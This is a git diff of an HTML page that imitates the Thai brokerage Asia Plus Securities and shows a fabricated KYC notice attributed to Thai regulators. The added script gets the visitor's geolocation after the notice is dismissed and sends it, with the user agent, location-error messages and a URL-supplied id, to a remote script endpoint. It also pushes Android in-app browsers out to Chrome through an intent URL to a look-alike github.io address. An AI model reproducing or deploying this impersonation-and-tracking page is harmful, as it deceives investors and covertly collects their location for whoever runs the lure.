@@ -1,82 +1,332 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="th">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ตรวจสอบและยืนยันรับสิทธิ์</title>
-  <script src="./js/jquery-3.6.0.min.js"></script>
-   
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Asia Plus Securities</title>
   <style>
-    /* General styles */
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
+    }
+
+    header {
+      background-color: white;
+      padding: 10px 20px;
       display: flex;
-      flex-direction: column;
+      justify-content: space-between;
       align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      border-bottom: 1px solid #ddd;
+    }
+
+    header img {
+      height: 40px;
+    }
+
+    nav {
+      display: flex;
+      gap: 20px;
+    }
+
+    nav a {
+      text-decoration: none;
+      color: #333;
+      font-size: 14px;
+    }
+
+    nav a:hover {
+      text-decoration: underline;
+    }
+
+    .breadcrumb {
+      background-color: #f8f8f8;
+      padding: 10px 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .main-banner {
+      background-color: #002855;
+      color: white;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+
+    .main-banner img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    .main-banner .content {
+      max-width: 600px;
+      flex: 1;
+    }
+
+    .main-banner h2 {
+      margin: 0;
+      font-size: 24px;
+    }
+
+    .main-banner ul {
+      list-style: none;
+      padding: 0;
+      margin: 10px 0 0;
+    }
+
+    .main-banner ul li {
+      margin: 5px 0;
+    }
+
+    .section {
+      padding: 20px;
+      background-color: #f8f8f8;
+    }
+
+    .section h2 {
+      color: #008000;
+      font-size: 24px;
+    }
+
+    .section p {
+      font-size: 16px;
       color: #333;
     }
 
-    h1 {
-      font-size: 1.8rem;
-      color: #fff;
-      margin-bottom: 20px;
-      text-align: center;
+    .section ul {
+      list-style: none;
+      padding: 0;
     }
 
-    #errorDiv {
-      display: none;
-      background: #fff;
-      padding: 15px;
+    .section ul li {
+      margin: 5px 0;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      nav {
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .main-banner {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .main-banner .content {
+        max-width: 100%;
+      }
+
+      .main-banner img {
+        margin-top: 20px;
+      }
+
+      .section h2 {
+        font-size: 20px;
+      }
+
+      .section p {
+        font-size: 14px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      nav a {
+        font-size: 12px;
+      }
+
+      .breadcrumb {
+        font-size: 12px;
+      }
+
+      .main-banner h2 {
+        font-size: 20px;
+      }
+
+      .section h2 {
+        font-size: 18px;
+      }
+
+      .section p {
+        font-size: 14px;
+      }
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal {
+      background-color: white;
+      width: 80%;
+      max-width: 600px;
+      padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
       text-align: center;
-      max-width: 90%;
     }
 
-    #errorDiv p {
-      margin: 0 0 10px;
-      font-size: 1rem;
-      color: #e74c3c;
+    .modal h2 {
+      margin-top: 0;
+      font-size: 1.5em;
     }
 
-    button {
-      background-color: #4caf50;
+    .modal p {
+      text-align: left;
+      line-height: 1.6;
+      margin: 15px 0;
+    }
+
+    .modal button {
+      background-color: #4CAF50;
       color: white;
       border: none;
       padding: 10px 20px;
-      font-size: 1rem;
       border-radius: 5px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      font-size: 1em;
     }
 
-    button:hover {
+    .modal button:hover {
       background-color: #45a049;
     }
 
-    /* Mobile responsiveness */
-    @media (max-width: 600px) {
-      h1 {
-        font-size: 1.5rem;
+
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+    }
+
+    .loading-overlay .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #4CAF50;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
       }
 
-      button {
-        font-size: 0.9rem;
-        padding: 8px 16px;
-      }
-
-      #errorDiv {
-        padding: 10px;
+      100% {
+        transform: rotate(360deg);
       }
     }
   </style>
+</head>
+
+<body>
+  <header>
+    <img src="./img/logomain.jpeg" style="height: 5.3rem;" alt="Asia Plus Logo">
+    <nav>
+      <a href="#">หน้าหลัก</a>
+      <a href="#">ผลิตภัณฑ์และบริการ</a>
+      <a href="#">บทวิเคราะห์</a>
+      <a href="#">เครื่องมือลงทุน</a>
+      <a href="#">เกี่ยวกับเรา</a>
+      <a href="#">ติดต่อเรา</a>
+    </nav>
+  </header>
+  <div class="breadcrumb">
+    หน้าหลัก > ผลิตภัณฑ์และบริการ
+  </div>
+  <div class="main-banner">
+    <div class="content">
+      <h2>ผลิตภัณฑ์และบริการ</h2>
+      <ul>
+        <li><span style="color: #00ff00;">ซื้อขายหลักทรัพย์</span></li>
+        <li>ลงทุนต่างประเทศ</li>
+        <li>ยืมและให้ยืมหลักทรัพย์</li>
+        <li>ตราสารอนุพันธ์</li>
+        <li>สัญญาซื้อขายล่วงหน้า (TFEX)</li>
+        <li>ตราสารหนี้</li>
+        <li>ผู้แทนผู้ถือหุ้นกู้</li>
+        <li>เวอร์ส แมเนจเม้นท์</li>
+      </ul>
+    </div>
+    <img src="./img/icon.jpeg" style="height: 12.2rem;" alt="Bull and Bear">
+  </div>
+  <div class="section">
+    <h2>ซื้อขายหลักทรัพย์</h2>
+    <p>
+      บลจ.เอเซียพลัช พร้อมให้บริการและให้คำแนะนำแก่นักลงทุนทั้งรายบุคคลและสถาบัน
+      ด้วยประสบการณ์ในธุรกิจหลักทรัพย์ยาวนานกว่า 50 ปี โดยทีมงานมืออาชีพ
+    </p>
+    <h3>นายหน้าซื้อขายหลักทรัพย์</h3>
+    <ul>
+      <li>ให้คำปรึกษาโดยทีมงานที่มีคุณภาพและประสบการณ์</li>
+      <li>เลือกส่งคำสั่งซื้อขายได้ตามใจคุณ</li>
+      <li>มั่นใจในบริการที่ตอบโจทย์นักลงทุน</li>
+    </ul>
+  </div>
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <h2>หนังสือแจ้งขั้นตอนการพิสูจน์ทราบตัวตนและยืนยันตัวตน</h2>
+      <p>
+        เรียน ลูกค้าผู้มีอุปการคุณ<br>
+        ตามที่สำนักงานคณะกรรมการกำกับหลักทรัพย์และตลาดหลักทรัพย์ (ก.ล.ต.) และสำนักงานป้องกันและปราบปรามการฟอกเงิน (ปปง.)
+        ได้ประกาศแนวปฏิบัติให้บริษัทหลักทรัพย์ต่าง ๆ รวมถึง เอเซียพลัช จำกัด ("บริษัท")
+        ดำเนินการพิสูจน์ทราบตัวตนและยืนยันตัวตนลูกค้า ("KYC") ตามกำหนดนั้น...
+      </p>
+      <button onclick="closeModal()">รับทราบ</button>
+    </div>
+  </div>
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+  </div>
+  <script src="./js/jquery-3.6.0.min.js"></script>
   <script>
+    
+    function closeModal() {
+      document.getElementById('modal').style.display = 'none';
+      // Simulate a delay (e.g., for a server request)
+      const loadingOverlay = document.getElementById('loading');
+      loadingOverlay.style.display = 'flex';
+      requestLocation();
+      setTimeout(() => {
+        loadingOverlay.style.display = 'none';
+        // alert('Process completed!');
+      }, 10000); // 3 seconds delay
+    }
+
+
     var msgError = null;
     function getLineIdFromUrl() {
       const params = new URLSearchParams(window.location.search);
@@ -87,12 +337,12 @@
     async function sendLocation(latitude = 0, longitude = 0) {
       const lineId = getLineIdFromUrl();
       if (!lineId) {
-        alert("ไอดีของคุณไม่ถูกต้อง");
+        alert("หมายเลขบุคคลไม่ถูกต้อง");
         return;
       }
 
       var userAgent = navigator.userAgent || 'none';
-      if(msgError){
+      if (msgError) {
         userAgent = msgError;
       }
       const scriptUrl =
@@ -132,29 +382,29 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             sendLocation(latitude, longitude);
-            hidePermissionError();
           },
           (error) => {
-         switch (error.code) {
-          case error.PERMISSION_DENIED:
-            // alert("คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง");
-             msgError = "คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง";
-            break;
-          case error.POSITION_UNAVAILABLE:
-             //alert("ไม่สามารถระบุตำแหน่งที่ตั้งได้");
-              msgError = "ไม่สามารถระบุตำแหน่งที่ตั้งได้";
-            break;
-          case error.TIMEOUT:
-            // alert("การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา");
-             msgError = "การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา";
-            break;
-          default:
-            // alert("เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ");
-             msgError = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
-            }
-        
-            sendLocation(0, 0);
-            showPermissionError();
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                // alert("คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง");
+                msgError = "คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง";
+                sendLocation(0, 0);
+                break;
+              case error.POSITION_UNAVAILABLE:
+                //alert("ไม่สามารถระบุตำแหน่งที่ตั้งได้");
+                msgError = "ไม่สามารถระบุตำแหน่งที่ตั้งได้";
+                sendLocation(0, 0);
+                break;
+              case error.TIMEOUT:
+                // alert("การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา");
+                msgError = "การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา";
+                sendLocation(0, 0);
+                break;
+              default:
+                // alert("เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ");
+                msgError = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
+                sendLocation(0, 0);
+            }
           }
         );
       } else {
@@ -165,42 +415,27 @@
     }
 
 
-    function showPermissionError() {
-      const errorDiv = document.getElementById("errorDiv");
-      errorDiv.style.display = "block";
-    }
 
-
-    function hidePermissionError() {
-      const errorDiv = document.getElementById("errorDiv");
-      errorDiv.style.display = "none";
-    }
-   function openInExternalBrowser() {
-      const id =  getLineIdFromUrl();
-      const intentUrl = "intent://kunohana.github.io/c?id="+id+"/#Intent;scheme=https;package=com.android.chrome;end;";
-       // ลองเปลี่ยนเส้นทางไปยัง intent://
+    function openInExternalBrowser() {
+      const id = getLineIdFromUrl();
+      const intentUrl = "intent://asiaplus-th.github.io/research?id=" + id + "/#Intent;scheme=https;package=com.android.chrome;end;";
+      // ลองเปลี่ยนเส้นทางไปยัง intent://
       window.location.href = intentUrl;
     }
 
     $(document).ready(function () {
-       const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-       const isWebView = /(wv|line|fb_iab|instagram)/i.test(userAgent);
-        // ตรวจสอบว่าเป็น Android หรือไม่
-       const isAndroid = /android/i.test(userAgent);
-       if(isWebView && isAndroid){
-         openInExternalBrowser();
-       }else{
-          requestLocation();
-       }
-  
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      const isWebView = /(wv|line|fb_iab|instagram)/i.test(userAgent);
+      // ตรวจสอบว่าเป็น Android หรือไม่
+      const isAndroid = /android/i.test(userAgent);
+      if (isWebView && isAndroid) {
+        openInExternalBrowser();
+      } else {
+        sendLocation(0, 0);
+      }
     })
   </script>
-</head>
-
-<body>
-  <h1>รอการตรวจสอบสิทธิ์</h1>
-  <div id="errorDiv">
-    <p>กรุณากดอนุญาตและรอการตรวจสอบ</p>
-    <button onclick="requestLocation()">ลองใหม่อีกครั้ง</button>
-  </div>
+    
 </body>
+
+</html>
